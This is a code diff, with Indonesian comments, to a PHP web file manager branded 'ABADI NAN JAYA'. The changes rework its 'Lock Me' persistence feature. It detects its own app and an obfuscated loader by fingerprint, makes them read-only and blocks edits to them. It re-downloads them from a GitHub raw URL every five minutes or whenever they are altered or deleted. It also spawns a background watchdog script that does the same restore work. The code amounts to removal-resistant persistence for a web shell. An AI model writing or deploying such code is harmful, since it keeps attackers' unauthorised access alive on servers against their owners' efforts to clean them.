@@ -1229,11 +1229,10 @@ function fm_home_rel() {
 }
 
 /* ========== LOCK ME (Linux only) ==========
- * Kunci index.php + abadi_litespeed.php:
- * - chmod 0444 (tanpa chattr — chattr biasanya butuh root)
- * - blokir edit/hapus/rename lewat FM
- * - self-heal: jika hilang/diubah → unduh ulang dari GitHub main
- * Tidak ada proses “unkillable”; proteksi = file + self-heal tiap request.
+ * Hanya kunci FILE KITA (nama bebas):
+ * - App: file yang sedang dieksekusi (__FILE__) jika fingerprint ABADI
+ * - Loader: PHP di folder yang sama yang cocok fingerprint abadi_litespeed
+ * Path + basename aktual disimpan di state; bukan hardcode index.php.
  */
 define('FM_LOCK_GH_INDEX', 'https://raw.githubusercontent.com/BlackNovaHub/AbadiNanJaya/refs/heads/main/index.php');
 define('FM_LOCK_GH_LOADER', 'https://raw.githubusercontent.com/BlackNovaHub/AbadiNanJaya/refs/heads/main/abadi_litespeed.php');
@@ -1269,37 +1268,220 @@ function fm_lock_state_dir() {
             return $dir;
         }
     }
-    // fallback: home FM (kurang ideal)
     $home = @realpath(dirname(__FILE__));
     $dir = $home ? $home : (string)getcwd();
     return $dir;
 }
 
-function fm_lock_state_file() {
-    $host = !empty($_SERVER['HTTP_HOST']) ? (string)$_SERVER['HTTP_HOST'] : 'cli';
-    $key = substr(md5(fm_lock_protect_dir() . '|' . $host), 0, 16);
-    return fm_lock_state_dir() . DIRECTORY_SEPARATOR . 'lock_' . $key . '.json';
+/**
+ * Entry point yang dibuka user (SCRIPT_FILENAME),
+ * bukan path cache include di /tmp.
+ */
+function fm_lock_self_path() {
+    static $p = null;
+    if ($p !== null) return $p;
+    if (!empty($_SERVER['SCRIPT_FILENAME'])) {
+        $sf = (string)$_SERVER['SCRIPT_FILENAME'];
+        if (is_file($sf)) {
+            $rp = @realpath($sf);
+            $p = $rp ? $rp : $sf;
+            return $p;
+        }
+    }
+    $raw = (string)__FILE__;
+    $rp = @realpath($raw);
+    $p = $rp ? $rp : $raw;
+    return $p;
 }
 
 function fm_lock_protect_dir() {
     static $d = null;
     if ($d !== null) return $d;
-    if (!empty($_SERVER['SCRIPT_FILENAME'])) {
-        $sf = (string)$_SERVER['SCRIPT_FILENAME'];
-        $d0 = @realpath(is_dir($sf) ? $sf : dirname($sf));
-        if ($d0) { $d = $d0; return $d; }
-    }
-    $d0 = @realpath(dirname(__FILE__));
-    $d = $d0 ? $d0 : dirname(__FILE__);
+    $self = fm_lock_self_path();
+    $d0 = @realpath(dirname($self));
+    if ($d0) { $d = $d0; return $d; }
+    $d = dirname($self);
     return $d;
 }
 
+function fm_lock_state_file() {
+    $host = !empty($_SERVER['HTTP_HOST']) ? (string)$_SERVER['HTTP_HOST'] : 'cli';
+    $key = substr(md5(fm_lock_self_path() . '|' . fm_lock_protect_dir() . '|' . $host), 0, 16);
+    return fm_lock_state_dir() . DIRECTORY_SEPARATOR . 'lock_' . $key . '.json';
+}
+
+/** Baca cuplikan file untuk fingerprint (aman untuk file besar). */
+function fm_lock_snip($path, $max = 120000) {
+    if (!is_file($path) || !is_readable($path)) return '';
+    $sz = @filesize($path);
+    if ($sz === false || $sz < 32) return '';
+    $fh = @fopen($path, 'rb');
+    if (!$fh) return '';
+    $data = @fread($fh, (int)$max);
+    @fclose($fh);
+    return is_string($data) ? $data : '';
+}
+
+/** True jika konten = file manager ABADI (bukan app lain / bukan loader). */
+function fm_lock_is_our_app_body($body) {
+    if (!is_string($body) || strlen($body) < 200) return false;
+    if (strpos($body, '<?php') === false && strpos($body, '<?PHP') === false) return false;
+    $marks = 0;
+    if (strpos($body, 'ABADI NAN JAYA') !== false || strpos($body, "FM_NAME") !== false) $marks++;
+    if (strpos($body, 'FM_AUTH_MODE') !== false) $marks++;
+    if (strpos($body, 'fm_lock_') !== false || strpos($body, 'function fm_is_authed') !== false) $marks++;
+    if (strpos($body, 'BlackNovaHub/AbadiNanJaya') !== false) $marks++;
+    if (strpos($body, 'toolLockMe') !== false || strpos($body, 'openLockMe') !== false) $marks++;
+    return $marks >= 2;
+}
+
+/** True jika konten = loader abadi_litespeed (nama bebas). */
+function fm_lock_is_our_loader_body($body) {
+    if (!is_string($body) || strlen($body) < 80) return false;
+    if (strpos($body, '<?php') === false && strpos($body, '<?PHP') === false) return false;
+    // app penuh bukan loader
+    if (fm_lock_is_our_app_body($body)) return false;
+    $marks = 0;
+    if (strpos($body, 'abadi_fetch') !== false) $marks++;
+    if (strpos($body, 'abadi_ua') !== false || strpos($body, 'function abadi_ua') !== false) $marks++;
+    if (strpos($body, 'ABADI_URL') !== false || strpos($body, "'A'.'B'.'A'.'D'.'I'.'_'.'U'.'R'.'L'") !== false) $marks++;
+    if (strpos($body, 'BlackNovaHub') !== false && strpos($body, 'AbadiNanJaya') !== false) $marks++;
+    if (strpos($body, 'abadi_ls_cache') !== false || strpos($body, 'abadi_cache') !== false) $marks++;
+    if (strpos($body, 'abadi_run') !== false) $marks++;
+    return $marks >= 2;
+}
+
+function fm_lock_is_our_app_file($path) {
+    return fm_lock_is_our_app_body(fm_lock_snip($path));
+}
+
+function fm_lock_is_our_loader_file($path) {
+    return fm_lock_is_our_loader_body(fm_lock_snip($path));
+}
+
+function fm_lock_norm_path($p) {
+    $p = str_replace('\\', '/', (string)$p);
+    $rp = @realpath($p);
+    if ($rp) $p = str_replace('\\', '/', $rp);
+    return strtolower($p);
+}
+
+/**
+ * Daftar target Lock Me (hanya file kita).
+ * @return array list of [id, role, name, path, url]
+ */
+function fm_lock_discover_targets() {
+    $out = array();
+    $seen = array();
+    $dir = fm_lock_protect_dir();
+    $dirN = fm_lock_norm_path($dir);
+
+    // Hanya scan folder entry (web). Jangan kunci cache /tmp dari include loader.
+    if (!is_dir($dir)) return $out;
+    $list = @scandir($dir);
+    if (!is_array($list)) return $out;
+
+    foreach ($list as $fn) {
+        if ($fn === '.' || $fn === '..') continue;
+        if (!preg_match('/\.php$/i', $fn)) continue;
+        if (strtolower($fn) === '.abadi_lock') continue;
+        $full = $dir . DIRECTORY_SEPARATOR . $fn;
+        if (!is_file($full)) continue;
+        $rp = @realpath($full);
+        $full = $rp ? $rp : $full;
+        $nk = fm_lock_norm_path($full);
+        if ($nk === '' || isset($seen[$nk])) continue;
+        // wajib di dalam protect dir
+        if ($dirN !== '' && strpos($nk, rtrim($dirN, '/') . '/') !== 0 && $nk !== $dirN . '/' . strtolower($fn)) {
+            // realpath still under dir?
+            if (strpos($nk, $dirN) !== 0) continue;
+        }
+
+        if (fm_lock_is_our_loader_file($full)) {
+            $out[] = array(
+                'id' => 'loader:' . md5($nk),
+                'role' => 'loader',
+                'name' => basename($full),
+                'path' => $full,
+                'url' => FM_LOCK_GH_LOADER,
+            );
+            $seen[$nk] = true;
+            continue;
+        }
+        if (fm_lock_is_our_app_file($full)) {
+            $out[] = array(
+                'id' => 'app:' . md5($nk),
+                'role' => 'app',
+                'name' => basename($full),
+                'path' => $full,
+                'url' => FM_LOCK_GH_INDEX,
+            );
+            $seen[$nk] = true;
+        }
+    }
+
+    // Entry script di folder yang sama belum terdeteksi (mis. snip gagal / loader tanpa marker)
+    $self = fm_lock_self_path();
+    $selfN = fm_lock_norm_path($self);
+    if ($selfN !== '' && !isset($seen[$selfN]) && is_file($self) && $dirN !== '' && strpos($selfN, $dirN) === 0) {
+        $isLoader = fm_lock_is_our_loader_file($self);
+        $isApp = fm_lock_is_our_app_file($self);
+        $ok = $isLoader || $isApp;
+        $role = $isLoader ? 'loader' : 'app';
+        // loader include app: __FILE__ = cache app, SCRIPT = loader tanpa snip → tetap loader
+        if (!$ok && fm_lock_is_our_app_body(fm_lock_snip((string)__FILE__))) {
+            $role = 'loader';
+            $ok = true;
+        }
+        if ($ok) {
+            $out[] = array(
+                'id' => $role . ':' . md5($selfN),
+                'role' => $role,
+                'name' => basename($self),
+                'path' => $self,
+                'url' => ($role === 'loader' ? FM_LOCK_GH_LOADER : FM_LOCK_GH_INDEX),
+            );
+        }
+    }
+
+    return $out;
+}
+
+/**
+ * Target aktif: jika lock ON pakai path tersimpan di state; else discover live.
+ * @return array list of targets
+ */
+function fm_lock_target_list() {
+    $state = fm_lock_read_state();
+    if (!empty($state['enabled']) && !empty($state['targets']) && is_array($state['targets'])) {
+        $list = array();
+        foreach ($state['targets'] as $t) {
+            if (!is_array($t) || empty($t['path'])) continue;
+            $path = (string)$t['path'];
+            $role = isset($t['role']) ? (string)$t['role'] : 'app';
+            $url = isset($t['url']) ? (string)$t['url'] : ($role === 'loader' ? FM_LOCK_GH_LOADER : FM_LOCK_GH_INDEX);
+            $name = isset($t['name']) && $t['name'] !== '' ? (string)$t['name'] : basename($path);
+            $id = isset($t['id']) && $t['id'] !== '' ? (string)$t['id'] : ($role . ':' . md5(fm_lock_norm_path($path)));
+            $list[] = array(
+                'id' => $id,
+                'role' => $role,
+                'name' => $name,
+                'path' => $path,
+                'url' => $url,
+            );
+        }
+        if ($list) return $list;
+    }
+    return fm_lock_discover_targets();
+}
+
+/** Map id => path (kompat helper lama). */
 function fm_lock_targets() {
-    $base = fm_lock_protect_dir();
-    return array(
-        'index.php' => $base . DIRECTORY_SEPARATOR . 'index.php',
-        'abadi_litespeed.php' => $base . DIRECTORY_SEPARATOR . 'abadi_litespeed.php',
-    );
+    $map = array();
+    foreach (fm_lock_target_list() as $t) {
+        $map[$t['id']] = $t['path'];
+    }
+    return $map;
 }
 
 function fm_lock_read_state() {
@@ -1405,21 +1587,20 @@ function fm_lock_is_protected_path($full) {
     if (!$full) return false;
     $state = fm_lock_read_state();
     if (empty($state['enabled'])) return false;
-    $n = strtolower(str_replace('\\', '/', (string)@realpath($full)));
-    if ($n === '' || $n === false) {
-        $n = strtolower(str_replace('\\', '/', (string)$full));
-    }
-    foreach (fm_lock_targets() as $t) {
-        $tn = strtolower(str_replace('\\', '/', (string)@realpath($t)));
-        if ($tn === '') $tn = strtolower(str_replace('\\', '/', $t));
+    $n = fm_lock_norm_path($full);
+    if ($n === '') return false;
+    foreach (fm_lock_target_list() as $t) {
+        $tn = fm_lock_norm_path($t['path']);
         if ($tn !== '' && $n === $tn) return true;
-        if (strtolower(basename($full)) === strtolower(basename($t))) {
-            $base = strtolower(str_replace('\\', '/', fm_lock_protect_dir()));
-            if (strpos($n, $base . '/') === 0 || $n === $base . '/' . strtolower(basename($t))) return true;
+    }
+    // mirror lock pointer saja
+    if (strtolower(basename((string)$full)) === '.abadi_lock') {
+        $base = fm_lock_norm_path(fm_lock_protect_dir());
+        $cand = fm_lock_norm_path(fm_lock_protect_dir() . DIRECTORY_SEPARATOR . '.abadi_lock');
+        if ($n === $cand || ($base !== '' && strpos($n, $base . '/') === 0 && basename($n) === '.abadi_lock')) {
+            return true;
         }
     }
-    // mirror lock file
-    if (strtolower(basename($full)) === '.abadi_lock') return true;
     return false;
 }
 
@@ -1428,48 +1609,43 @@ function fm_lock_self_heal($forceGithub = false) {
     $state = fm_lock_read_state();
     if (empty($state['enabled'])) return array('ok' => true, 'enabled' => false);
 
-    $urls = array(
-        'index.php' => FM_LOCK_GH_INDEX,
-        'abadi_litespeed.php' => FM_LOCK_GH_LOADER,
-    );
-    $targets = fm_lock_targets();
+    $targets = fm_lock_target_list();
     $hashes = isset($state['hashes']) && is_array($state['hashes']) ? $state['hashes'] : array();
     $restored = array();
     $errors = array();
     $now = time();
     $lastSync = isset($state['last_sync']) ? (int)$state['last_sync'] : 0;
-    // re-sync dari GitHub tiap 5 menit ATAU force
     $needSync = $forceGithub || ($now - $lastSync > 300);
 
-    foreach ($targets as $name => $path) {
-        $url = $urls[$name];
-        $exists = is_file($path) && filesize($path) > 32;
+    foreach ($targets as $t) {
+        $id = $t['id'];
+        $path = $t['path'];
+        $url = $t['url'];
+        $label = $t['name'] . ' (' . $t['role'] . ')';
+        $exists = is_file($path) && @filesize($path) > 32;
         $curHash = $exists ? @md5_file($path) : '';
-        $wantHash = isset($hashes[$name]) ? $hashes[$name] : '';
+        $wantHash = isset($hashes[$id]) ? $hashes[$id] : '';
         $broken = !$exists || $curHash === '' || $curHash === false;
-        $changed = ($wantHash !== '' && $curHash !== '' && !hash_equals($wantHash, $curHash));
+        $changed = ($wantHash !== '' && $curHash !== '' && !hash_equals($wantHash, (string)$curHash));
 
         if ($broken || $changed || $needSync) {
             $body = fm_lock_fetch_url($url);
             if ($body === false) {
-                $errors[] = $name . ': fetch gagal';
-                // broken + no fetch: coba biarkan
+                $errors[] = $label . ': fetch gagal';
                 continue;
             }
             $newHash = md5($body);
-            // jika hanya needSync dan hash sama, skip write
             if (!$broken && !$changed && $curHash === $newHash) {
-                $hashes[$name] = $newHash;
+                $hashes[$id] = $newHash;
                 continue;
             }
             if (!fm_lock_write_protected_file($path, $body)) {
-                $errors[] = $name . ': write gagal';
+                $errors[] = $label . ': write gagal @ ' . $path;
                 continue;
             }
-            $hashes[$name] = $newHash;
-            $restored[] = $name;
+            $hashes[$id] = $newHash;
+            $restored[] = $t['name'];
         } else {
-            // pastikan read-only untuk user web
             @chmod($path, 0444);
         }
     }
@@ -1478,9 +1654,8 @@ function fm_lock_self_heal($forceGithub = false) {
     $state['last_sync'] = $needSync ? $now : $lastSync;
     $state['last_heal'] = $now;
     $state['last_restored'] = $restored;
+    $state['targets'] = $targets;
     fm_lock_write_state($state);
-
-    // coba jaga watchdog ringan (bukan unkillable)
     fm_lock_ensure_watchdog();
 
     return array(
@@ -1489,12 +1664,13 @@ function fm_lock_self_heal($forceGithub = false) {
         'restored' => $restored,
         'errors' => $errors,
         'hashes' => $hashes,
+        'targets' => $targets,
     );
 }
 
 function fm_lock_watchdog_script() {
     $dir = fm_lock_state_dir();
-    return $dir . DIRECTORY_SEPARATOR . 'lock_watch_' . substr(md5(fm_lock_protect_dir()), 0, 12) . '.php';
+    return $dir . DIRECTORY_SEPARATOR . 'lock_watch_' . substr(md5(fm_lock_self_path()), 0, 12) . '.php';
 }
 
 function fm_lock_ensure_watchdog() {
@@ -1503,17 +1679,20 @@ function fm_lock_ensure_watchdog() {
     if (empty($state['enabled'])) return false;
 
     $script = fm_lock_watchdog_script();
-    $index = fm_lock_targets();
-    $indexPath = $index['index.php'];
+    $targets = fm_lock_target_list();
+    $pack = array();
+    foreach ($targets as $t) {
+        $pack[] = array(
+            'id' => $t['id'],
+            'path' => $t['path'],
+            'url' => $t['url'],
+            'name' => $t['name'],
+        );
+    }
     $code = '<?php
-// Abadi Lock Me watchdog — restore GitHub copies if missing/changed
 error_reporting(0);
 $lock = ' . var_export(fm_lock_state_file(), true) . ';
-$targets = ' . var_export($index, true) . ';
-$urls = array(
-  "index.php" => ' . var_export(FM_LOCK_GH_INDEX, true) . ',
-  "abadi_litespeed.php" => ' . var_export(FM_LOCK_GH_LOADER, true) . ',
-);
+$targets = ' . var_export($pack, true) . ';
 $st = @json_decode(@file_get_contents($lock), true);
 if (!is_array($st) || empty($st["enabled"])) exit(0);
 function _ab_fetch($u){
@@ -1533,13 +1712,15 @@ function _ab_write($p,$b){
 }
 $hashes=isset($st["hashes"])&&is_array($st["hashes"])?$st["hashes"]:array();
 $changed=false;
-foreach($targets as $n=>$p){
-  $ex=is_file($p)&&filesize($p)>32;
+foreach($targets as $t){
+  $id=isset($t["id"])?$t["id"]:md5($t["path"]);
+  $p=$t["path"]; $u=$t["url"];
+  $ex=is_file($p)&&@filesize($p)>32;
   $h=$ex?@md5_file($p):"";
-  $want=isset($hashes[$n])?$hashes[$n]:"";
+  $want=isset($hashes[$id])?$hashes[$id]:"";
   if(!$ex || ($want && $h && $h!==$want) || !$want){
-    $body=_ab_fetch($urls[$n]);
-    if($body!==false){ _ab_write($p,$body); $hashes[$n]=md5($body); $changed=true; }
+    $body=_ab_fetch($u);
+    if($body!==false){ _ab_write($p,$body); $hashes[$id]=md5($body); $changed=true; }
   } else {
     @chmod($p,0444);
   }
@@ -1549,7 +1730,6 @@ if($changed){ $st["hashes"]=$hashes; $st["last_heal"]=time(); @file_put_contents
     @file_put_contents($script, $code);
     @chmod($script, 0500);
 
-    // jalankan loop background jika shell ada (bisa di-kill user — tidak disembunyikan)
     $pidFile = $script . '.pid';
     $alive = false;
     if (is_file($pidFile)) {
@@ -1586,31 +1766,40 @@ function fm_lock_enable() {
     if (!fm_lock_is_linux()) {
         return array('ok' => false, 'error' => 'Lock Me hanya untuk OS Linux');
     }
-    $urls = array(
-        'index.php' => FM_LOCK_GH_INDEX,
-        'abadi_litespeed.php' => FM_LOCK_GH_LOADER,
-    );
-    $targets = fm_lock_targets();
+    $targets = fm_lock_discover_targets();
+    if (!$targets) {
+        return array('ok' => false, 'error' => 'Tidak menemukan file ABADI di folder ini');
+    }
     $hashes = array();
     $written = array();
-    foreach ($targets as $name => $path) {
-        $body = fm_lock_fetch_url($urls[$name]);
+    $savedTargets = array();
+    foreach ($targets as $t) {
+        $body = fm_lock_fetch_url($t['url']);
         if ($body === false) {
-            return array('ok' => false, 'error' => 'Gagal unduh ' . $name . ' dari GitHub');
+            return array('ok' => false, 'error' => 'Gagal unduh source untuk ' . $t['name'] . ' (' . $t['role'] . ')');
         }
-        if (!fm_lock_write_protected_file($path, $body)) {
-            return array('ok' => false, 'error' => 'Gagal tulis/kunci ' . $name . ' (permission?)');
+        // tulis ke PATH & NAMA aktual (bukan paksa index.php)
+        if (!fm_lock_write_protected_file($t['path'], $body)) {
+            return array('ok' => false, 'error' => 'Gagal tulis/kunci ' . $t['name'] . ' @ ' . $t['path']);
         }
-        $hashes[$name] = md5($body);
-        $written[] = $name;
+        $hashes[$t['id']] = md5($body);
+        $written[] = $t['name'] . ' [' . $t['role'] . ']';
+        $savedTargets[] = array(
+            'id' => $t['id'],
+            'role' => $t['role'],
+            'name' => $t['name'],
+            'path' => $t['path'],
+            'url' => $t['url'],
+        );
     }
     $state = array(
         'enabled' => true,
         'since' => gmdate('c'),
         'dir' => fm_lock_protect_dir(),
+        'self' => fm_lock_self_path(),
         'hashes' => $hashes,
         'last_sync' => time(),
-        'files' => $targets,
+        'targets' => $savedTargets,
     );
     fm_lock_write_state($state);
     fm_lock_ensure_watchdog();
@@ -1619,9 +1808,11 @@ function fm_lock_enable() {
         'enabled' => true,
         'linux' => true,
         'files' => $written,
+        'targets' => $savedTargets,
         'dir' => fm_lock_protect_dir(),
+        'self' => fm_lock_self_path(),
         'state_file' => fm_lock_state_file(),
-        'message' => 'Lock Me aktif: file dilindungi + self-heal dari GitHub',
+        'message' => 'Lock Me aktif: ' . count($savedTargets) . ' file kita dilindungi (path+nama aktual)',
     );
 }
 
@@ -1630,14 +1821,13 @@ function fm_lock_disable() {
         return array('ok' => false, 'error' => 'Lock Me hanya untuk OS Linux');
     }
     $state = fm_lock_read_state();
-    foreach (fm_lock_targets() as $path) {
-        if (is_file($path)) @chmod($path, 0644);
+    foreach (fm_lock_target_list() as $t) {
+        if (!empty($t['path']) && is_file($t['path'])) @chmod($t['path'], 0644);
     }
     $mirror = fm_lock_protect_dir() . DIRECTORY_SEPARATOR . '.abadi_lock';
     if (is_file($mirror)) @chmod($mirror, 0644);
     @unlink($mirror);
 
-    // stop watchdog bila bisa
     $pidFile = fm_lock_watchdog_script() . '.pid';
     if (is_file($pidFile)) {
         $pid = (int)trim((string)@file_get_contents($pidFile));
@@ -1661,15 +1851,25 @@ function fm_lock_disable() {
 function fm_lock_status() {
     $linux = fm_lock_is_linux();
     $state = fm_lock_read_state();
+    $list = !empty($state['enabled']) ? fm_lock_target_list() : fm_lock_discover_targets();
     $files = array();
-    foreach (fm_lock_targets() as $name => $path) {
+    foreach ($list as $t) {
+        $path = $t['path'];
         $ex = is_file($path);
-        $files[$name] = array(
+        $key = $t['name'] . ' · ' . $t['role'];
+        // unique key if same name twice
+        if (isset($files[$key])) $key = $t['name'] . ' · ' . $t['role'] . ' · ' . substr($t['id'], -6);
+        $files[$key] = array(
+            'id' => $t['id'],
+            'role' => $t['role'],
+            'name' => $t['name'],
             'path' => $path,
+            'url' => $t['url'],
             'exists' => $ex,
             'size' => $ex ? (int)@filesize($path) : 0,
             'md5' => $ex ? (string)@md5_file($path) : '',
             'writable' => $ex ? is_writable($path) : false,
+            'ours' => $ex ? ($t['role'] === 'loader' ? fm_lock_is_our_loader_file($path) : fm_lock_is_our_app_file($path)) : false,
         );
     }
     return array(
@@ -1678,9 +1878,11 @@ function fm_lock_status() {
         'enabled' => $linux && !empty($state['enabled']),
         'state' => $state,
         'files' => $files,
+        'self' => fm_lock_self_path(),
+        'self_name' => basename(fm_lock_self_path()),
         'state_file' => fm_lock_state_file(),
         'dir' => fm_lock_protect_dir(),
-        'note' => 'Tanpa chattr (butuh root). Proteksi: chmod 0444 + blokir FM + self-heal GitHub tiap request/watchdog.',
+        'note' => 'Hanya file ABADI terdeteksi (fingerprint). Nama bebas. Path aktual disimpan. Restore GitHub ke path yang sama. Tanpa chattr.',
     );
 }
 
@@ -2492,11 +2694,7 @@ if ($__fm_is_api) {
             case 'write': {
                 $p = safe_path(fm_arr($_POST, 'path', ''));
                 if ($p === false) json_out(['ok'=>false,'error'=>'Path tidak valid'], 400);
-                $__lk = fm_lock_read_state();
-                if (fm_lock_is_protected_path($p) || (
-                    is_string($p) && in_array(strtolower(basename($p)), array('index.php','abadi_litespeed.php','.abadi_lock'), true)
-                    && !empty($__lk['enabled'])
-                )) {
+                if (fm_lock_is_protected_path($p)) {
                     fm_lock_self_heal(true);
                     json_out(['ok'=>false,'error'=>'Lock Me: file dilindungi (tidak bisa edit)'], 403);
                 }
@@ -3890,7 +4088,7 @@ tr:hover .row-acts, tr.selected .row-acts { opacity: 1; }
         <button type="button" class="tool-btn" id="toolSysinfo" title="Server Info">Sysinfo</button>
         <button type="button" class="tool-btn" id="toolPhpinfo" title="PHP Info">PHP Info</button>
         <button type="button" class="tool-btn" id="toolWp" title="WordPress Admin">WP Admin</button>
-        <button type="button" class="tool-btn" id="toolLockMe" title="Lock Me — lindungi index.php &amp; abadi_litespeed.php (Linux)">Lock Me</button>
+        <button type="button" class="tool-btn" id="toolLockMe" title="Lock Me — lindungi file ABADI kita saja (path &amp; nama aktual, Linux)">Lock Me</button>
         <button type="button" class="tool-btn" id="toolSettings" title="Settings">Settings</button>
       </div>
 
@@ -5061,11 +5259,11 @@ tr:hover .row-acts, tr.selected .row-acts { opacity: 1; }
     if (st.enabled) {
       b.classList.add('lock-on');
       b.textContent = 'Locked';
-      b.title = 'Lock Me aktif — klik untuk kelola';
+      b.title = 'Lock Me aktif — file ABADI kita dilindungi';
     } else {
       b.classList.remove('lock-on');
       b.textContent = 'Lock Me';
-      b.title = 'Lock Me — lindungi index.php & abadi_litespeed.php';
+      b.title = 'Lock Me — lindungi file ABADI kita saja (path & nama aktual)';
     }
   }
   function openLockMe() {
@@ -5086,26 +5284,42 @@ tr:hover .row-acts, tr.selected .row-acts { opacity: 1; }
         return;
       }
       var files = st.files || {};
-      var rows = Object.keys(files).map(function (k) {
+      var keys = Object.keys(files);
+      var rows = keys.length ? keys.map(function (k) {
         var f = files[k];
-        return '<div class="kernel-row" style="border:0;padding:6px 0"><div class="kk">' + esc(k) + '</div><div class="kv mono" style="font-size:11px">' +
-          (f.exists ? ('OK · ' + (f.size || 0) + ' B · ' + (f.writable ? 'writable' : 'locked')) : 'MISSING') +
-          '<br><span style="color:var(--muted2)">' + esc(f.path || '') + '</span></div></div>';
-      }).join('');
+        var role = (f.role || '').toUpperCase();
+        var badge = role === 'LOADER'
+          ? '<span style="color:var(--accent);font-weight:700">LOADER</span>'
+          : '<span style="color:var(--primary);font-weight:700">APP</span>';
+        var stLine = f.exists
+          ? ('OK · ' + (f.size || 0) + ' B · ' + (f.writable ? 'writable' : 'locked') + (f.ours === false ? ' · <span style="color:#f87171">fingerprint?</span>' : ''))
+          : '<span style="color:#f87171">MISSING</span>';
+        return '<div class="kernel-row" style="border:0;padding:8px 0;border-bottom:1px solid rgba(36,48,22,.45)">' +
+          '<div class="kk">' + badge + '</div>' +
+          '<div class="kv mono" style="font-size:11px;line-height:1.55">' +
+          '<strong style="color:var(--text)">' + esc(f.name || k) + '</strong><br>' +
+          stLine + '<br>' +
+          '<span style="color:var(--muted2)">path: ' + esc(f.path || '') + '</span><br>' +
+          '<span style="color:var(--muted2)">heal: ' + esc(f.url || '') + '</span>' +
+          '</div></div>';
+      }).join('') : '<div style="color:#f87171;font-size:13px">Tidak ada file ABADI terdeteksi di folder ini.</div>';
       box.innerHTML =
         '<div class="set-hero" style="margin-bottom:14px"><div><strong>LOCK ME</strong>' +
-        '<p>Lindungi <code>index.php</code> &amp; <code>abadi_litespeed.php</code>: tidak bisa edit/hapus/rename lewat FM. ' +
-        'Jika dihapus atau diubah, otomatis restore dari GitHub main. Self-heal tiap request + watchdog opsional (Linux).</p></div></div>' +
+        '<p>Hanya mengunci <strong>file kita</strong> (fingerprint ABADI). Nama boleh apa saja — path &amp; basename aktual dideteksi otomatis. ' +
+        'Bukan sembarang <code>index.php</code> milik CMS lain. Edit/hapus/rename lewat FM diblok; restore GitHub ke <em>path yang sama</em>.</p></div></div>' +
         '<div class="mono" style="font-size:12px;line-height:1.7;margin-bottom:12px">' +
         'Status: <strong style="color:' + (st.enabled ? 'var(--primary)' : 'var(--muted)') + '">' + (st.enabled ? 'LOCKED' : 'OFF') + '</strong><br>' +
+        'Self (running): <strong>' + esc(st.self_name || '') + '</strong><br>' +
+        '<span style="color:var(--muted2)">' + esc(st.self || '') + '</span><br>' +
         'Dir: ' + esc(st.dir || '') + '<br>' +
         'State: ' + esc(st.state_file || '') + '</div>' +
+        '<div style="margin-bottom:4px;font-size:10px;font-weight:800;letter-spacing:.08em;text-transform:uppercase;color:var(--muted2)">Target terdeteksi (' + keys.length + ')</div>' +
         '<div style="margin-bottom:12px">' + rows + '</div>' +
         '<div style="font-size:11px;color:var(--muted2);margin-bottom:12px;line-height:1.45">' + esc(st.note || '') + '</div>' +
         '<div style="display:flex;gap:8px;flex-wrap:wrap">' +
         (st.enabled
           ? '<button type="button" class="btn btn-ghost" id="lockOff">Unlock</button><button type="button" class="btn btn-primary" id="lockHeal">Force Heal (GitHub)</button>'
-          : '<button type="button" class="btn btn-primary" id="lockOn">Aktifkan Lock Me</button>') +
+          : '<button type="button" class="btn btn-primary" id="lockOn"' + (keys.length ? '' : ' disabled') + '>Aktifkan Lock Me</button>') +
         '</div><div id="lockMsg" style="margin-top:12px"></div>';
       var msg = document.getElementById('lockMsg');
       if (document.getElementById('lockOn')) {
